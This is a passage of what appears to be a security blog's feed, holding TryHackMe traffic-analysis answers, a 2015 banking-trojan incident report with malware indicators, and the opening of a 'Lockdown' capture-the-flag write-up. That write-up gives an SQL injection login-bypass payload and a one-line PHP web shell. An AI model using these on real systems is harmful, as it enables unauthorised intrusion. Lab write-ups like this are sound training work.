+&lt;h2 id=&quot;task-3---infection-2&quot;&gt;&lt;strong&gt;Task 3 - [Infection 2]&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;1. Provide the IP address of the victim machine.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.75.146&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;conn&quot; | cut id.orig_h, id.resp_p, id.resp_h | sort | uniq&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/7.png&quot; title=&quot;brimthm/7.png&quot; alt=&quot;brimthm/7.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2. Provide the IP address the victim made the POST connections to.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5.181.156.252&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method==&quot;POST&quot; | cut ts, uid, id, method, uri, status_code&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/8.png&quot; title=&quot;brimthm/8.png&quot; alt=&quot;brimthm/8.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3. How many POST connections were made to the IP address in the previous question?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4. Provide the domain where the binary was downloaded from.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hypercustom.top&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut id.orig_h, id.resp_h, id.resp_p, method,host, uri | uniq -c&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/9.png&quot; title=&quot;brimthm/9.png&quot; alt=&quot;brimthm/9.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;5. Provide the name of the binary including the full URI.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jollion/apines.exe&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;6. Provide the IP address of the domain that hosts the binary.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;45.95.203.28&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;7. There were 2 Suricata “A Network Trojan was detected” alerts. What were the source and destination IP addresses?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.75.146, 45.95.203.28&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;event_type==&quot;alert&quot; | alerts := union(alert.category) by src_ip, dest_ip&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/10.png&quot; title=&quot;brimthm/10.png&quot; alt=&quot;brimthm/10.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;8. Taking a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.top&lt;/code&gt; domain in HTTP requests, provide the name of the stealer (Trojan that gathers information from a system) involved in this packet capture using &lt;a href=&quot;https://urlhaus.abuse.ch/browse/&quot;&gt;URLhaus Database&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Redline Stealer&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;task-4---infection-3&quot;&gt;&lt;strong&gt;Task 4 - [Infection 3]&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;1. Provide the IP address of the victim machine.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.75.232&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut id.orig_h, id.resp_h, id.resp_p, method,host, uri | uniq -c&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/11.png&quot; title=&quot;brimthm/11.png&quot; alt=&quot;brimthm/11.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2. Provide three C2 domains from which the binaries were downloaded (starting from the earliest to the latest in the timestamp)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;efhoahegue.ru,afhoahegue.ru,xfhoahegue.ru&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut ts, id.orig_h, id.resp_h, id.resp_p, method,host, uri | uniq -c | sort ts&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/12.png&quot; title=&quot;brimthm/12.png&quot; alt=&quot;brimthm/12.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3. Provide the IP addresses for all three domains in the previous question.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;162.217.98.146, 199.21.76.77, 63.251.106.25&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4. How many unique DNS queries were made to the domain associated from the first IP address from the previous answer?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;dns&quot; query==&quot;efhoahegue.ru&quot;&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/13.png&quot; title=&quot;brimthm/13.png&quot; alt=&quot;brimthm/13.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;5. How many binaries were downloaded from the above domain in total?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; host==&quot;efhoahegue.ru&quot;&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/14.png&quot; title=&quot;brimthm/14.png&quot; alt=&quot;brimthm/14.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;6. Provided the user-agent listed to download the binaries.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:25.0) Gecko/20100101 Firefox/25.0&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Explanation:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/15.png&quot; title=&quot;brimthm/15.png&quot; alt=&quot;brimthm/15.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;7. Provide the amount of DNS connections made in total for this packet capture.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;986&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;count() by _path | sort -r&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/16.png&quot; title=&quot;brimthm/16.png&quot; alt=&quot;brimthm/16.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;8. With some OSINT skills, provide the name of the worm using the first domain you have managed to collect from Question 2. (Please use quotation marks for Google searches, don’t use .ru in your search, and DO NOT interact with the domain directly).&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Phorphiex&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Explanation:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/17.png&quot; title=&quot;brimthm/17.png&quot; alt=&quot;brimthm/17.png&quot; /&gt;
+          &lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="blueteam" /><category term="soc" /><summary type="html">Lab Note The lab is provided by TryHackMe - Creators: heavenraiza &amp;amp; RussianPanda.</summary></entry><entry><title type="html">2015-08-07 - Traffic Analysis Report</title><link href="https://jayngng.github.io/blog/2015-08-07-traffic-analysis/" rel="alternate" type="text/html" title="2015-08-07 - Traffic Analysis Report" /><published>2021-10-08T06:20:21+11:00</published><updated>2021-10-08T06:20:21+11:00</updated><id>https://jayngng.github.io/blog/2015-08-07-traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/2015-08-07-traffic-analysis/">&lt;h2 id=&quot;executive-summary&quot;&gt;&lt;strong&gt;Executive Summary&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;On Wednesday 2015-08-07, Degrando Rustlyn’s computer was infected by a Banking Trojan via opening a malicious link in an email, which downloaded a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rar&lt;/code&gt; achieve containing malware. After the infection occurred, the SOC team immediately contacted Degrando Rustlyn to start investigating the incident.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;details&quot;&gt;&lt;strong&gt;Details&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;Infected computer’s host name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PERTRUIDE-PC&lt;/code&gt;.
+Infected computer’s IP address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.137.113&lt;/code&gt;.
+Infected computer’s MAC address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00:1e:4f:6c:ba:05 (Dell_6c:ba:05)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;The malicious email that caused the infection:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Date/Time: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tue, 4 Aug 2015 20:16:47 +0000 (UTC)&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Subject line: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Voce recebeu comentario de voz em sua foto - 3192132&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Sender: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Facebook.com &amp;lt;accounts@passport.com&amp;gt;&lt;/code&gt; (spoofed sender).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Domain and IP addresses of the related traffic:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;www.ica.ufmg.br - 150.16.130.253&lt;/li&gt;
+  &lt;li&gt;australiano2015.com.br - 69.49.115.40&lt;/li&gt;
+  &lt;li&gt;downloadpdf.demojoomla.com - 67.212.169.218&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Malware associated with the infection:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;Filename&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;Size&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;MD5&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Download.rar&lt;/td&gt;
+      &lt;td&gt;3 KB (3,205 bytes)&lt;/td&gt;
+      &lt;td&gt;6325f04a77fce24c8c43b71d817d3fe7&lt;/td&gt;
+      &lt;td&gt;Downloaded from a link in a malicious email.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Download.vbe&lt;/td&gt;
+      &lt;td&gt;5 KB (4,804 bytes)&lt;/td&gt;
+      &lt;td&gt;50ac6b67b095aeb4e85b3f94e66d8666&lt;/td&gt;
+      &lt;td&gt;Extracted from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download.rar&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Gravar.zip&lt;/td&gt;
+      &lt;td&gt;9.3 MB (9,303,045 bytes)&lt;/td&gt;
+      &lt;td&gt;e1d6e85f72d76845f9dc1c5c3d4fd469&lt;/td&gt;
+      &lt;td&gt;Downloaded via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download.vbe&lt;/code&gt; script.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;dmw.exe&lt;/td&gt;
+      &lt;td&gt;18.9 MB (18,925,024 bytes)&lt;/td&gt;
+      &lt;td&gt;3c3e8b9b18fb1d14095adb0a16d457d8&lt;/td&gt;
+      &lt;td&gt;Extracted from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gravar.zip&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;analysis-process&quot;&gt;&lt;strong&gt;Analysis Process&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;Opening a malicious email with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thunderbird&lt;/code&gt;, we can see that the attach opens a link to a suspicious-looking website.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/1.png&quot; title=&quot;20150807/1.png&quot; alt=&quot;20150807/1.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Spending sometimes to inspect related traffic in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; packet capture, we discover that it lured victim to download a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download.rar&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/2.png&quot; title=&quot;20150807/2.png&quot; alt=&quot;20150807/2.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Extracting the RAR archieve exposed a malicious VBScript that will automatically download a ZIP named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gravar.zip&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/3.png&quot; title=&quot;20150807/3.png&quot; alt=&quot;20150807/3.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Inside the ZIP contains a Windows executable called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmw.exe&lt;/code&gt;, which is then executed to infect the victim system.&lt;/p&gt;
+
+&lt;p&gt;Here is a piece of code that demonstrates the VBScript executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmw.exe&lt;/code&gt; binary.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOTAR&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmw.exe&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/4.png&quot; title=&quot;20150807/4.png&quot; alt=&quot;20150807/4.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;If we further investigate the HTTPS artifacts, we can see that the victim had downloaded the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gravar.zip&lt;/code&gt; and execute the VBScript inside it.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/5.png&quot; title=&quot;20150807/5.png&quot; alt=&quot;20150807/5.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Replaying the PCAP traffic via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt;, it will trigger the alert of Banking Trojan.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 2015-08-07-traffic-analysis-exercise.pcap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf
+08/05-16:04:36.644292  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2021439:3] ET TROJAN Win32/Bancos.AMM CnC Beacon &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.137.113:49311 -&amp;gt; 69.49.115.40:80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 154&lt;/code&gt;, we discover some patterns that alert &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/8.png&quot; title=&quot;20150807/8.png&quot; alt=&quot;20150807/8.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;or try uploading the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmw.exe&lt;/code&gt; binary onto Virus Total, it also lights up as a Chrismas tree.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/6.png&quot; title=&quot;20150807/6.png&quot; alt=&quot;20150807/6.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Now, we can safely conclude that the isolated system was infected by a Banking Trojan.&lt;/p&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="blueteam" /><category term="incidentresponse" /><summary type="html">Executive Summary On Wednesday 2015-08-07, Degrando Rustlyn’s computer was infected by a Banking Trojan via opening a malicious link in an email, which downloaded a .rar achieve containing malware. After the infection occurred, the SOC team immediately contacted Degrando Rustlyn to start investigating the incident.</summary></entry><entry><title type="html">Lockdown - THM</title><link href="https://jayngng.github.io/blog/lockdown-thm/" rel="alternate" type="text/html" title="Lockdown - THM" /><published>2021-10-07T07:09:37+11:00</published><updated>2021-10-07T07:09:37+11:00</updated><id>https://jayngng.github.io/blog/lockdown---thm</id><content type="html" xml:base="https://jayngng.github.io/blog/lockdown-thm/">&lt;h2 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;We will retain the intial access by abusing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL injection&lt;/code&gt; vulnerability to bypass authentication and upload a PHP reverse shell. Enumerating the target system locally, we discover that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt; user reuses the password stored in a config file, which we will use to compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt; shell access. Finally, privilege escalation can be achieved via injecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clamscan&lt;/code&gt;’s rules.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;h4 id=&quot;sql-injection&quot;&gt;&lt;strong&gt;SQL Injection&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;Navigate to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; page at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://contacttracer.thm/admin/login.php&lt;/code&gt;, we are prompted to login.&lt;/p&gt;
+
+&lt;p&gt;Trying some basic credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:toor&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt; but none of them works out, we come up with an idea of using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sql injection&lt;/code&gt; …&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Payload: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&apos; or 1=1-- -&lt;/code&gt;, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sign In&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/lockdown/1.png&quot; title=&quot;lockdown/1.png&quot; alt=&quot;lockdown/1.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;And we successfully bypassed the authentication prompt!.&lt;/p&gt;
+
+&lt;p&gt;(More information about the vulnerability can be found &lt;a href=&quot;https://packetstormsecurity.com/files/164005/COVID-19-Contact-Tracing-System-With-QR-Code-Scanning-1.0-SQL-Injection.html&quot;&gt;here&lt;/a&gt;.)&lt;/p&gt;
+
+&lt;p&gt;After landing on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin Panel&lt;/code&gt;, we then navigate to the following URL: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://contacttracer.thm/admin/?page=system_info&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;php-shell-upload&quot;&gt;&lt;strong&gt;PHP Shell Upload&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;Now we prepare a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmback.php&lt;/code&gt; file with the following contents:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
